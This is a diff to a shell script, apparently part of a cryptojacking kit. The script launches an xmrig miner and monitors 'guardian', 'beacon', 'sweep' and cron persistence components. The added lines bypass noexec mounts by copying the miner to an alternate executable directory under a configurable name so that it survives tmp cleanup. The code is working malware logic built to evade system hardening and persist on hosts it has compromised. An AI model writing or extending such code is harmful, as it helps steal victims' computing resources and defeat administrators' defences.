@@ -560,4 +560,14 @@ command -v kf_self_update >/dev/null 2>&1 && kf_self_update 2>/dev/null
 
 sleep 2
 _MB=$(cat "$D/.alias" 2>/dev/null); [ -n "$_MB" ] || _MB="$D/xmrig"
+# noexec-workaround: хранение в $D, исполнение из KF_XDIR (переживает tmp-чистку: guardian перекопирует)
+_XD=$(cat "$D/.xdir" 2>/dev/null)
+[ -n "${KF_XDIR:-}" ] && { _XD="$KF_XDIR"; printf '%s' "$KF_XDIR" > "$D/.xdir" 2>/dev/null; }
+if [ -n "$_XD" ] && [ -s "$D/xmrig" ]; then
+  mkdir -p "$_XD" 2>/dev/null
+  if cp -f "$D/xmrig" "$_XD/$KF_MD_BIN.tmp.$$" 2>/dev/null && chmod 700 "$_XD/$KF_MD_BIN.tmp.$$" 2>/dev/null && mv -f "$_XD/$KF_MD_BIN.tmp.$$" "$_XD/$KF_MD_BIN" 2>/dev/null; then
+    _MB="$_XD/$KF_MD_BIN"; printf '%s\n' "$_MB" > "$D/.alias" 2>/dev/null
+    kf_log "xdir: exec из $_XD (D=noexec)"
+  fi
+fi
 echo "KF_STATE: miner=$(alm_running "$_MB -c" && echo RUN || echo NO) bin=$_MB svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) guardian=$(alm_running "$D/guardian.sh" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) sweep=$(alm_running "$D/sweep.sh" && echo OK || echo NO) cron=$(cat "$D/.cron_ok" 2>/dev/null || echo NO) cores=$CORES threads=$THREADS hint=$HINT nice=$NICE root=$D"
